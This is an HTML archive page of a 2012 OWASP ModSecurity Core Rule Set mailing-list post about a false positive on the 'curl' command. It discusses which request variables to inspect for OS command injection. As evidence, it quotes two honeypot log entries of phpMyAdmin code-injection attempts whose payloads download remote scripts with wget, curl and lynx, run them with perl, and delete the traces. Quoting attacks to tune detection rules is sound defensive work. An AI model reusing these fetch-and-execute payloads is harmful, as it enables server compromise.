@@ -1,0 +1,91 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Owasp-modsecurity-core-rule-set] False Positives with OS Commands
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20False%20Positives%20with%20OS%20Commands&In-Reply-To=%3CCBF7CC52.51CC3%25rbarnett%40trustwave.com%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <style type="text/css">
+       pre {
+           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
+           }
+   </style>
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="001093.html">
+   <LINK REL="Next"  HREF="001100.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Owasp-modsecurity-core-rule-set] False Positives with OS Commands</H1>
+    <B>Ryan Barnett</B> 
+    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20False%20Positives%20with%20OS%20Commands&In-Reply-To=%3CCBF7CC52.51CC3%25rbarnett%40trustwave.com%3E"
+       TITLE="[Owasp-modsecurity-core-rule-set] False Positives with OS Commands">RBarnett at trustwave.com
+       </A><BR>
+    <I>Fri Jun  8 19:35:46 UTC 2012</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="001093.html">[Owasp-modsecurity-core-rule-set] [JIRA] Resolved: (CORERULES-77) Modsecurity creates fall positives when used with SVN-over-HTTP
+</A></li>
+        <LI>Next message: <A HREF="001100.html">[Owasp-modsecurity-core-rule-set] OWASP ModSecurity CRS v2.2.5	Available
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#1094">[ date ]</a>
+              <a href="thread.html#1094">[ thread ]</a>
+              <a href="subject.html#1094">[ subject ]</a>
+              <a href="author.html#1094">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>I am reviewing an old CRS Jira ticket on a false positive hit for the &quot;curl&quot; command - <A HREF="https://www.modsecurity.org/tracker/browse/CORERULES-78">https://www.modsecurity.org/tracker/browse/CORERULES-78</A>
+
+In reviewing this, it looks like we need to remove the REQUEST_FILENAME from the list of vars inspected.  From my research, the only really location to look for OS command injection is within ARGS or REQUEST_HEADERS.  As an example, look at this recent blog post I did with some example attacks targeting curl - <A HREF="http://blog.spiderlabs.com/2012/02/honeypot-alert-phpmyadmin-code-injection-attacks.html">http://blog.spiderlabs.com/2012/02/honeypot-alert-phpmyadmin-code-injection-attacks.html</A>
+
+
+62.149.12.62 - - [21/Feb/2012:04:25:55 -0600] &quot;GET /mysql//config.sample.inc.php?eval=system('echo cd /tmp;wget <A HREF="http://199.115.228.9/vp.txt">http://199.115.228.9/vp.txt</A> -O p2.txt;curl -O <A HREF="http://199.115.228.9/vp.txt;">http://199.115.228.9/vp.txt;</A> mv vp.txt d.txt;lyxn -DUMP <A HREF="http://199.115.228.9/vp.txt">http://199.115.228.9/vp.txt</A> &gt;p3.txt;perl d.txt; perl p2.txt;perl p3.txt;rm -rf *.txt'); HTTP/1.1&quot; 404 226 &quot;-&quot; &quot;curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.12.6.2 zlib/1.2.3 libidn/1.9 libssh2/1.2.4&quot;
+
+195.145.156.126 - - [21/Feb/2012:05:42:27 -0600] &quot;GET /mysql/config/config.inc.php?eval=system('echo cd /tmp;wget <A HREF="http://dinte.altervista.org/apache_32.png">http://dinte.altervista.org/apache_32.png</A> -O p2.txt;curl -O <A HREF="http://dinte.altervista.org/apache_32.png;">http://dinte.altervista.org/apache_32.png;</A> mv apache_32.png p.txt;lyxn -DUMP <A HREF="http://dinte.altervista.org/apache_32.png">http://dinte.altervista.org/apache_32.png</A> &gt;p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf *.txt'); HTTP/1.1&quot; 404 225 &quot;-&quot; &quot;curl/7.18.1 (i686-suse-linux-gnu) libcurl/7.18.1 OpenSSL/0.9.8g zlib/1.2.3 libidn/1.8&quot;
+
+These attacks are with ARGS.
+
+Has anyone ever legitimately had an OS command attack targeting the REQUEST_FILENAME?
+
+--
+Ryan Barnett
+Trustwave SpiderLabs
+ModSecurity Project Leader
+OWASP ModSecurity CRS Project Leader
+
+________________________________
+This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: &lt;<A HREF="http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120608/63bc2a19/attachment.html">http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120608/63bc2a19/attachment.html</A>&gt;
+</PRE>
+
+
+
+
+
+
+
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="001093.html">[Owasp-modsecurity-core-rule-set] [JIRA] Resolved: (CORERULES-77) Modsecurity creates fall positives when used with SVN-over-HTTP
+</A></li>
+	<LI>Next message: <A HREF="001100.html">[Owasp-modsecurity-core-rule-set] OWASP ModSecurity CRS v2.2.5	Available
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#1094">[ date ]</a>
+              <a href="thread.html#1094">[ thread ]</a>
+              <a href="subject.html#1094">[ subject ]</a>
+              <a href="author.html#1094">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
+mailing list</a><br>
+</body></html>
